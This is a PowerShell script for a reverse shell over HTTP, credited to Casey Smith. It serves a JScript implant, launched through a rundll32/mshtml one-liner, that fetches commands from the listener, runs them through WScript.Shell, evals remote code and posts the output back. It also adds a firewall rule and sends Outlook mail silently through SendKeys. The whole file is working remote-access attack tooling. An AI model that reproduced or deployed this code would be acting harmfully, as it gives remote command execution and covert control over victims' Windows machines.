<#
    
  Author: Casey Smith @subTee

  License: BSD3-Clause
	
  .SYNOPSIS
  
  Simple Reverse Shell over HTTP. Execute Commands on Client.  
  
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1/connect",false);h.Send();B=h.ResponseText;eval(B)
  
  Listening Server IP Address
  
#>

$Server = '127.0.0.1' #Listening IP. Change This.
$EmailRecipient = "user@example.com"


function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	$i = $true
	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
     write-host "Host Connected" -fore Cyan
        $message = '
					function stringStartsWith (string, prefix) {
					return string.slice(0, prefix.length) == prefix;
					}
					
					function SendMail(to,body,sub) {
						var theApp    //Reference to Outlook.Application
						var theMailItem   //Outlook.mailItem
						//Attach Files to the email, Construct the Email including     
						//To(address),subject,body
						var subject = sub
						var msg = body
						//Create a object of Outlook.Application
						try
						{
						var theApp = new ActiveXObject("Outlook.Application")
						var theMailItem = theApp.CreateItem(0) // value 0 = MailItem
						  //Bind the variables with the email
						  theMailItem.to = to
						  theMailItem.Subject = (subject);
						  theMailItem.Body = (msg);
						  
						  //Show the mail before sending for review purpose
						  //You can directly use the theMailItem.send() function
						  //This Sends Email without Prompt. *grin*
						  theMailItem.display();
						  var Shell = new ActiveXObject( "WScript.Shell" ); 
						  Shell.AppActivate("Outlook");
						  Shell.SendKeys( "%s" );
						  }
						catch(err)
						{

						}
					}
					
					while(true)
					{
						
						h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						h.Open("GET","http://'+$Server+'/rat",false);
						h.Send();
						c = h.ResponseText;
						if(c == "sleep" || c=="") { for (var i=0;i<10000;i++){} continue; }
						if(c == "mail") { SendMail("'+$EmailRecipient+'","Yup Its Alive","Important"); continue}
						if(stringStartsWith(c,"#")){ while(c.charAt(0) == "#"){s=c.substr(1);eval(s);break;} continue;}
						r = new ActiveXObject("WScript.Shell").Exec(c);
						var so;
						while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.Open("POST","http://'+$Server+'/rat",false);
						p.Send(so);
					}
					
		'

    }		 
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $message = Read-Host "JS $hostip>"		
    }
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
